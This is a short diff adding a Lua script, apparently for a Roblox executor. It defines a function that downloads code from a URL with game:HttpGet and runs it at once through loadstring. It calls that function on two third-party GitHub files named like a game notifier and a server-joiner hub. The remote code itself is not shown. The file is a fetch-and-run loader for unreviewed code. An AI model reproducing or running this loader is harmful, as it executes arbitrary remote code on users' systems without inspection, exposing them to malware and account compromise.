@@ -1,0 +1,11 @@
+local function runScript(url)
+    local s, err = pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+    if not s then
+        warn("Erro ao carregar script: "..err)
+    end
+end
+
+runScript("https://raw.githubusercontent.com/realgengar/Brainrot/refs/heads/main/notify.lua")
+runScript("https://github.com/karlosedson/mkzhub/raw/refs/heads/main/makerzjoiner.lua")
